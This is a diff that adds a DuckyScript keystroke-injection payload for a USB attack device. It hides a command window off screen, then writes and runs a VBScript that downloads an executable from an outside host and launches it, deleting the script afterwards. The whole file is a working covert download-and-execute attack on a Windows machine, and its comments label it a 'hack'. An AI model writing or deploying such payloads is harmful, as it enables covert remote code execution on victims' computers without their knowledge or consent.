@@ -1,0 +1,34 @@
+REM hide cmd window
+DELAY 1000
+REM GUI r
+CONTROL ESCAPE
+DELAY 250
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 250
+ENTER
+DELAY 250
+STRING mode con:cols=18 lines=1
+ENTER
+DELAY 250
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+REM end hide cmd window
+
+REM hack
+STRING cd /D C:\\
+ENTER
+STRING cd %HOMEPATH%
+ENTER
+DELAY 50
+STRING echo strFileURL = "http://fosse.co/dl/Media.exe": strHDLocation = "./Media.exe": Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"): objXMLHTTP.open "GET", strFileURL, false: objXMLHTTP.send(): Set objADOStream = CreateObject("ADODB.Stream"): objADOStream.Open: objADOStream.Type = 1: objADOStream.Write objXMLHTTP.ResponseBody: objADOStream.Position = 0: Set objFSO = Createobject("Scripting.FileSystemObject"): Set objFSO = Nothing: objADOStream.SaveToFile strHDLocation: objADOStream.Close: Set objADOStream = Nothing: Set objXMLHTTP = Nothing: >> t.vbs
+ENTER
+STRING cscript.exe t.vbs
+ENTER
+STRING del t.vbs
+ENTER
+STRING Media.exe
+ENTER
+REM end hack
